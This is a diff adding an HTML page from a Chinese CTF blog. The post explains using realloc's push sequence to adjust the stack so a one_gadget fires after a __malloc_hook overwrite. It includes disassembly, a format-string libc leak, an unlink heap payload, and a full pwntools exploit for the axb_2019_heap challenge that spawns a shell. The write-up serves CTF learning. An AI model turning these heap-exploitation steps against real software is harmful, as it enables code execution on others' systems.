@@ -1,0 +1,1141 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/shiroha.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/shiroha.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,heap," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在 pwn 做题的时候,偶尔会碰到 one_gadget 全部不满足条件的情况,这就需要使用 realloc 来调整栈">
+<meta property="og:type" content="article">
+<meta property="og:title" content="one_gadget 使用realloc调整栈">
+<meta property="og:url" content="http://www.ethushiroha.com/realloc_stack.html">
+<meta property="og:site_name" content="stdout">
+<meta property="og:description" content="在 pwn 做题的时候,偶尔会碰到 one_gadget 全部不满足条件的情况,这就需要使用 realloc 来调整栈">
+<meta property="og:locale">
+<meta property="og:image" content="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924384776.png">
+<meta property="og:image" content="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924728797.png">
+<meta property="og:image" content="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924920221.png">
+<meta property="og:image" content="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924970041.png">
+<meta property="article:published_time" content="2020-07-20T01:30:10.000Z">
+<meta property="article:modified_time" content="2020-11-25T13:44:32.253Z">
+<meta property="article:author" content="stdout">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924384776.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.ethushiroha.com/realloc_stack.html"/>
+
+
+
+
+
+  <title>one_gadget 使用realloc调整栈 | stdout</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">stdout</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-文章">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            文章
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-友联">
+          <a href="/py.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            友联
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.ethushiroha.com/realloc_stack.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="stdout">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">one_gadget 使用realloc调整栈</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-20T09:30:10+08:00">
+                2020-07-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/heap/" itemprop="url" rel="index">
+                    <span itemprop="name">heap</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在 pwn 做题的时候,偶尔会碰到 one_gadget 全部不满足条件的情况,这就需要使用 <code>realloc</code> 来调整栈</p>
+<a id="more"></a>
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在劫持 <code>__malloc_hook</code> 之后由于栈不可调整,所以有时候会不满足 <code>one_gadget</code> 的触发条件<br>在 <code>realloc</code> 函数中,有 6 个<code>push</code> 操作,可以调整栈的情况<br>而且 <code>realloc</code> 会调用 <code>__realloc_hook</code> , <code>__realloc_hook</code> 就在 <code>__malloc_hook</code> 附近</p>
+<h2 id="realloc-的-push-操作"><a href="#realloc-的-push-操作" class="headerlink" title="realloc 的 push 操作"></a>realloc 的 push 操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0000000000846C0 realloc         proc near               ; DATA XREF: LOAD:0000000000006BA0↑o</span><br><span class="line">.text:00000000000846C0                                         ; LOAD:000000000000CF48↑o ...</span><br><span class="line">.text:00000000000846C0</span><br><span class="line">.text:00000000000846C0 var_60          &#x3D; qword ptr -60h</span><br><span class="line">.text:00000000000846C0 var_58          &#x3D; byte ptr -58h</span><br><span class="line">.text:00000000000846C0 var_48          &#x3D; byte ptr -48h</span><br><span class="line">.text:00000000000846C0</span><br><span class="line">.text:00000000000846C0 ; __unwind &#123;</span><br><span class="line">.text:00000000000846C0                 push    r15             ; Alternative name is &#39;__libc_realloc&#39;</span><br><span class="line">.text:00000000000846C2                 push    r14</span><br><span class="line">.text:00000000000846C4                 push    r13</span><br><span class="line">.text:00000000000846C6                 push    r12</span><br><span class="line">.text:00000000000846C8                 mov     r13, rsi</span><br><span class="line">.text:00000000000846CB                 push    rbp</span><br><span class="line">.text:00000000000846CC                 push    rbx</span><br><span class="line">.text:00000000000846CD                 mov     rbx, rdi</span><br><span class="line">.text:00000000000846D0                 sub     rsp, 38h</span><br><span class="line">.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:00000000000846DB                 mov     rax, [rax]</span><br><span class="line">.text:00000000000846DE                 test    rax, rax</span><br><span class="line">.text:00000000000846E1                 jnz     loc_848E8</span><br></pre></td></tr></table></figure>
+
+<h2 id="调整实战"><a href="#调整实战" class="headerlink" title="调整实战"></a>调整实战</h2><p>用的是 <code>axb_2019_heap</code><br>一个很常见的溢出,使用 <code>unlink</code> ,得到任意地址读写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content,ends = <span class="number">1</span></span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">formats = <span class="string">&quot;%3$p%11$p&quot;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(formats)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">codebase = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x1186</span></span><br><span class="line">print(<span class="string">&quot;codebase ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(codebase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(&quot;x/20gx &#123;&#125;&quot;.format(addr))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heapArray = codebase + <span class="number">0x202060</span></span><br><span class="line">fake_fd = heapArray + <span class="number">0x20</span></span><br><span class="line">payload = (p64(<span class="number">0</span>) + p64(<span class="number">0xE1</span>) + p64(fake_fd - <span class="number">0x18</span>) + p64(fake_fd - <span class="number">0x10</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0xE0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xE0</span>) + p64(<span class="number">0xE0</span>)</span><br><span class="line">payload += p64(<span class="number">0xF0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p>直接使用 <code>one_gadget[1]</code> 发现栈并不满足条件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(realloc_hook) + <span class="string">b&#x27;\xf8\x00&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + base</span><br><span class="line">edit(<span class="number">1</span>,p64(one_gadget) + p64(one_gadget))</span><br></pre></td></tr></table></figure>
+<p><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924384776.png" alt="file"></p>
+<p>需要用 <code>realloc</code> 来调整栈</p>
+<h3 id="调整技巧"><a href="#调整技巧" class="headerlink" title="调整技巧"></a>调整技巧</h3><p>首先看到 <code>realloc</code> 函数的汇编,在 <code>offset = 0x10</code> 的地方有一个 <code>sub rsp,38h</code>,因为这一句是在所有的 <code>push</code> 操作完了之后,所以必定会执行,而且影响栈的分布, 所以先控制 <code>__malloc_hook</code> 指向 <code>realloc + 0x10</code> 同时 <code>__realloc_hook</code> 指向 <code>one_gadget</code><br>观察这个时候栈的分布<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924728797.png" alt="file"></p>
+<p>先来解释一下 <code>x/8gx $rsp + 0x30 - 0x30</code><br>因为需要满足条件的地址是 <code>$rsp + 0x30</code> ,而且 <code>push</code> 操作有 6 个,每个影响是 <code>0x8</code></p>
+<p>观察到 <code>$rsp + 0x30 - 0x8</code> 的地方有一个 0,那么对应的就需要一个 <code>push</code> 操作, 现在把 <code>realloc + 0x10</code> 改为 <code>realloc + 0xC</code><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924920221.png" alt="file"><br>可以看到已经满足了条件</p>
+<p>得到了 shell<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585924970041.png" alt="file"></p>
+<h3 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;node3.buuoj.cn&quot;,&quot;29506&quot;)</span></span><br><span class="line"><span class="comment">#elf = ELF(&#x27;./heap&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content,ends = <span class="number">1</span></span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter the content: &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu()</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Enter an index:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">formats = <span class="string">&quot;%3$p%11$p&quot;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(formats)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,addr)</span><br><span class="line">base = addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = sh.recv(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">codebase = <span class="built_in">int</span>(c,<span class="number">16</span>) - <span class="number">0x1186</span></span><br><span class="line">print(<span class="string">&quot;codebase ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(codebase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(&quot;x/20gx &#123;&#125;&quot;.format(addr))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xF8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heapArray = codebase + <span class="number">0x202060</span></span><br><span class="line">fake_fd = heapArray + <span class="number">0x20</span></span><br><span class="line">payload = (p64(<span class="number">0</span>) + p64(<span class="number">0xE1</span>) + p64(fake_fd - <span class="number">0x18</span>) + p64(fake_fd - <span class="number">0x10</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0xE0</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xE0</span>) + p64(<span class="number">0xE0</span>)</span><br><span class="line">payload += p64(<span class="number">0xF0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">atoi = <span class="number">0x201FA0</span></span><br><span class="line"></span><br><span class="line">malloc_hook = base + libc.dump(<span class="string">&quot;__malloc_hook&quot;</span>)</span><br><span class="line">realloc_hook = base + libc.dump(<span class="string">&quot;__realloc_hook&quot;</span>)</span><br><span class="line">realloc = base + libc.dump(<span class="string">&quot;realloc&quot;</span>)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(realloc_hook) + <span class="string">b&#x27;\xf8\x00&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + base</span><br><span class="line">edit(<span class="number">1</span>,p64(one_gadget) + p64(realloc + <span class="number">0xC</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(&quot;x/20gx &#123;&#125;&quot;.format(codebase + 0x202060))</span></span><br><span class="line">dbg(<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(one_gadget))</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">0x88</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          
+            <a href="/tags/heap/" rel="tag"><i class="fa fa-tag"></i> heap</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/an_example.html" rel="next" title="一个堆溢出的小例子">
+                <i class="fa fa-chevron-left"></i> 一个堆溢出的小例子
+              </a>
+            
